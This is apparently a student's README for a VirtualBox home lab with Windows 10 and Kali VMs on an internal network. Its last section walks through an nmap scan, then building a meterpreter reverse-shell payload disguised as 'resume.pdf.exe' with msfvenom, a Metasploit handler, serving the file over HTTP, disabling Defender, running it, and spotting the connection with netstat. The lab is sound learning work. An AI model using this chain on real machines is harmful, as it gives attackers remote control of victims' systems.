# Cybersecurity-HomeLab (on a Windows Machine) 

## Objective

Building a cybersecurity home-lab for offense and defense 

### Skills Learned

- Virtual Machines
- NAT network
- VM Snapshots
- VM Guest additions

  

### Tools Used

- VirtualBox
- https://www.youtube.com/watch?v=kku0fVfksrk
- 
  

### Steps to install all the ISO VM inside VirtualBox and config

- Download Windows 10 from Windows official website. https://www.microsoft.com/en-ca/software-download/windows10ISO
- Download Kali Linux from the official website and choose the virtual box option.
- When installing windows 10 make sure to add the ISO file and skip unattended installation.
- Open the Vbox file for Kali Linux to add it to VirtualBox

### Creating a internal network for the VMS

- We will choose internal network for all the VMs and name it.
- We will go to the Windows 10 machine and right-click on the internet icon and go to change adapter options
- We will go to options for the ethernet and find internet protocol 4 and click on properties and add the static IP addresses we want. (ip 192.168.20.10, subnet 255.255.255.0 and gateway empty)
- We can check the new IPs by going to CMD and ipconfigms
- We will do the same to the Kali by going to the ethernet and right-click and edit connection
- We select the wired connection and then options.
- We go to IPv4 settings
- We select manual from the Method dropdown
- We will add new address, 192.168.20.11 and the netmask 24
- We go to terminal and ifconfig to check the static IP address we choose.

### Creating telemetry to detect evil

- We will go to Kali and then type nmap -A <the windows IP> -Pn and we look for an open port
- We can see port 3389/tcp open
- We will now create a malware using msfvenom
- We can see all the payloads by typing msfvenom -l payloads
- We will choose a meterpreter reverse tcp for windows
- We type msfvenom -p <then the payload we want to create> lhost=ip of kali lport=4444 -f exe -o resume.pdf.exe then we enter and the file will be created at the desktop
- We can now open metasploit with mfsconsole
- Now we need to use the handler by typing <use exploit/multi/hander> and we will now be in the exploit itself
- We can now change the options by typing <options> to see what we can config.
- We set the payload to <windows/x64/meterpreter/reverse_tcp
- We set the lhost to the Kali (attacker VM) ip
- We can start the hander by typing <exploit> and it will b e now listening
- We need to create an http.server to send the malware to the windows VM
- We can use python by typing < python3 -m http.server 9999
- We now need to send the payload to the Windows VM by disabling the windows defender.
- We go to Windows Security--> Virus and threat protection and turn off real-time protection
- We now go to the browser and type 192.168.20.11:9999 Thats the Kali IP and the http port we created
- We can now download the payload we made and can view it in the finder.
- We install the payload and then open CMD (command prompt) as an admin
- We can type <netstat -anob> and we can find the Kali IP address has established a connection with a PID number
- We can go to the task manager and go to details and look for the PID and we can find the resume.pdf.exe payload running
- We can go to Kali and we can see a session is open and has a connection to the win VM
- We can now type <help> to see all the commands we can use
- We can type <shell> to open a shell and type <net user> to see the user of the OS.
- 
